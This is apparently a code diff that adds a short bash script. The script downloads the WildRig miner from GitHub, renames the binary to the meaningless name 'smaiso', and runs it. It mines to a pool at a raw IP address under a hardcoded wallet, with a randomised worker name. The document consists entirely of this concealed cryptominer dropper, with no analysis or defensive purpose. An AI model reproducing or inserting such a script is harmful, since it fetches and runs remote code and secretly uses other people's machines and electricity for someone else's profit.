@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.51.2/wildrig-multi-linux-0.51.2.tar.gz
+tar xf wildrig-multi-linux-0.51.2.tar.gz
+mv wildrig-multi smaiso
+./smaiso --algo pearlhash --url 38.129.16.172:80 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
